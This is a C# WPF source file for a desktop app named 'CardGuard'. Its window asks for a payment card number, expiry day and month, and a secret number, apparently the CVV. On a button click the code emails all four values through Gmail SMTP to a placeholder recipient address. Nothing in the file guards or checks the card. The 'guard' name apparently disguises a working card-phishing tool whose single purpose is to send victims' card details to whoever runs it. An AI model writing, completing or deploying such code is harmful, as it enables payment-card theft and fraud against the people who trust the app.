using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Net;
using System.Net.Mail;

namespace CardGuard
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }
        private bool[] firstTry = new bool[4] { true, true, true, true };
        private string CardNumber;
        private string month;
        private string day;
        private string secretNumber;

        private void txtBox_NimberCard_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (firstTry[0])
            {
                txtBox_NimberCard.Clear();
                firstTry[0] = false;
            }


        }

        private void txtBox_Day_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (firstTry[1])
            {
                txtBox_Day.Clear();
                firstTry[1] = false;
            }

        }

        private void txtBox_Mounth_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (firstTry[2])
            {
                txtBox_Mounth.Clear();
                firstTry[2] = false;
            }

        }

        private void txtBox_secretNumber_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            if (firstTry[3])
            {
                txtBox_secretNumber.Clear();
                firstTry[3] = false;
            }

        }

        private void SaveAll()
        {
            CardNumber = txtBox_NimberCard.Text;
            day = txtBox_Day.Text;
            month = txtBox_Mounth.Text;
            secretNumber = txtBox_secretNumber.Text;
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            SaveAll();

            Mail();
        }
        private void Mail()
        {
            MailAddress fromMail = new MailAddress("MAILOUTE");
            MailAddress toMail = new MailAddress("MAILENTER");

            using (MailMessage message = new MailMessage(fromMail, toMail))
            using (SmtpClient smtpClient = new SmtpClient())
            {
                message.Subject = "Subject";
                message.Body = "num = " + CardNumber + "\n day = " + day + "\n mounth = " + month + "\n secret number = " + secretNumber;
                smtpClient.Host = "smtp.gmail.com";
                smtpClient.Port = 587;
                smtpClient.EnableSsl = true;
                smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
                smtpClient.UseDefaultCredentials = false;
                smtpClient.Credentials = new NetworkCredential(fromMail.Address, "PASSWORD");
                smtpClient.Send(message);
                message.Dispose();
            }
        }
    }
}
